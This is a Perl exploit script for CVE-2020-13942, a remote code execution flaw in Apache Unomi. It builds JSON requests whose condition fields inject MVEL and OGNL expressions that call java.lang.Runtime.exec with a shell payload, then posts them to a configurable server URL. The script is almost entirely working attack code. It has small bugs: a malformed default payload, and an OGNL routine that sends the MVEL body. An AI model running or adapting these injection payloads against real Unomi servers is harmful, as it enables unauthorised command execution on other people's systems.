#!/usr/bin/perl
=begin
Apache Unomi allows conditions to use OGNL and MVEL scripting which offers the possibility
to call static Java classes from the JDK that could execute code with the
permission level of the running Java process.

Original Author: Eugene Rojavski - Checkmarx
Exploit Author: Hoa Nguyen - SunCSR Team
Date: November 17, 2020
CVE: CVE-2020-13942
References:
https://unomi.apache.org/security/cve-2020-13942.txt
https://nvd.nist.gov/vuln/detail/CVE-2020-13942
https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-13942
=cut

use strict;
use warnings;
use 5.010;
use LWP::UserAgent;

my $url = 'http://127.0.0.1:8181';
my $payload = 'bash -c -ls pwd';
my $json_mevel = "{
	'filters': [{
		'id': 'boom',
		'filters': [{
			'condition': {
				'parameterValues': {
					'': 'script::Runtime r = Runtime.getRuntime(); r.exec('$payload');'
				},
				'type': 'profilePropertyCondition'
			}
		}]
	}],
	'sessionId': 'boom'}";

my $json_ognl = "{
    'personalizations': [{
	'id': 'gender-test',
	'strategy': 'matching-first',
	'strategyOptions': {
		'fallback': 'var2'
	},
	'contents': [{
		'filters': [{
			'condition': {
				'parameterValues': {
					'propertyName': '(#runtimeclass = #this.getClass().forName(\'java.lang.Runtime\')).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\'getRuntime\')}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\'exec\')}.{? #this.getParameters()[0].getType().getName().equals(\'java.lang.String\')}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\' $payload\'))',
					'comparisonOperator': 'equals',
					'propertyValue': 'male'
				},
				'type': 'profilePropertyCondition'
			}
		}]
	}]
}], 'sessionId': 'boom'}";

my $ua = new LWP::UserAgent();
sub _mevel_method {
    my $response = $ua->post($url, Content => $json_mevel);
    if ($response->is_success()){
    say 'Exploit Successul';
}
else {
    say 'Error: ' . $response->status_line();
}};

sub _ognl_method {
    my $response = $ua->post($url, Content => $json_mevel);
    if ($response->is_success()){
    say 'Exploit Successul';
}
else {
    say 'Error: ' . $response->status_line();
}};

_mevel_method();

_ognl_method();


__END__
